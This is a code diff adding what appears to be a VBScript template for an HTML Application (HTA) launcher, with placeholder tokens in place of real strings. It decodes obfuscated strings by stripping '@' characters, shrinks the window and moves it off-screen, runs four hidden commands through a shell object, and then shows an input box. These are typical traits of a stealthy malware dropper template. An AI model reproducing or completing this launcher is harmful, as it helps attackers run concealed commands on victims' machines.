@@ -1,0 +1,35 @@
+﻿
+function %var1%(%var2%) 
+iT = 64
+%var1% = Replace(%var2%, chr(iT), "")
+end function
+
+window.resizeTo 0,2 
+
+function %var3%() 
+InputBox %var1%("%const8%"),%var1%("%const8%"),%var1%("%const9%")
+end function
+
+window.moveTo Int(window.screen.width + 637 ), Int( window.screen.height + 748 )
+
+ 
+
+
+CreateObject (%var1%("%const2%")).run %var1%("%const4%"),2,TRUE
+
+window.moveTo Int(window.screen.width + 647 ), Int( window.screen.height + 741 )
+
+CreateObject (%var1%("%const2%")).run %var1%("%const13%"),2,TRUE
+
+window.moveTo Int(window.screen.width + 657 ), Int( window.screen.height + 742 )
+
+CreateObject (%var1%("%const2%")).run %var1%("%const14%"),2,TRUE
+
+window.moveTo Int(window.screen.width + 677 ), Int( window.screen.height + 743 )
+
+CreateObject(%var1%("%const2%")).Run %var1%("%const7%"),2,TRUE
+
+%var3%()
+ 
+
+close
